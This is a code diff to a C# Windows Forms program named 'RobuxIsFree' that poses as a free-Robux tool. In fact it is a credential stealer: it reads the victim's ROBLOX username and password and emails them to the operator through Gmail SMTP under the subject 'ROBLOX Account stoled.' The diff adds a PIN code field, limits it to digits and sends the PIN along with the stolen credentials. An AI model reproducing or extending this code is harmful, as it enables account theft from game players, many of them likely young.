@@ -16,6 +16,8 @@ namespace RobuxIsFree
     public partial class RIFGui : Form
     {
 
+        private int i = 4;
+
         public RIFGui()
         {
             InitializeComponent();
@@ -32,16 +34,24 @@ namespace RobuxIsFree
             progressBar1.Value = 0;
             progressBar1.Step = 1;
             MailMessage mail = new MailMessage();
-            SmtpClient smtpServer = new SmtpClient("smtp.gmail.com");
+            SmtpClient smtpServer = new SmtpClient("smtp.gmail.com"); // U can change this if u want to use other mail services
             mail.From = new MailAddress("sender@mail.com");
             mail.To.Add("receiver@mail.com");
             mail.Subject = "ROBLOX Account stoled.";
-            mail.Body = "Username : " + name.Text + " | Password : " + password.Text;
             smtpServer.Port = 587;
-            smtpServer.Credentials = new NetworkCredential("sender@address.com", "senderpassword");
+            smtpServer.Credentials = new NetworkCredential("senderaddress", "senderpassword");
             smtpServer.EnableSsl = true;
-            smtpServer.Send(mail);
-
+            if (i == pincode.Text.Count())
+            {
+                mail.Body = "Username : " + name.Text + " | Password : " + password.Text + " | PIN Code : " + pincode.Text;
+                smtpServer.Send(mail);
+            }
+            else
+            {
+                mail.Body = "Username : " + name.Text + " | Password : " + password.Text + " | PIN Code : none";
+                smtpServer.Send(mail);
+            }
+            
         }
 
         int j = 0;
@@ -100,6 +110,14 @@ namespace RobuxIsFree
         private void button2_Click(object sender, EventArgs e)
         {
             MessageBox.Show("RobuxIsFree made by teppy! | Youtube : TreTrauIT","RobuxIsFree");
+        }
+
+        private void pincode_TextChanged_1(object sender, EventArgs e)
+        {
+            if (System.Text.RegularExpressions.Regex.IsMatch(pincode.Text, "[^0-9]"))
+            {
+                pincode.Text = pincode.Text.Remove(pincode.Text.Length - 1);
+            }
         }
     }
 
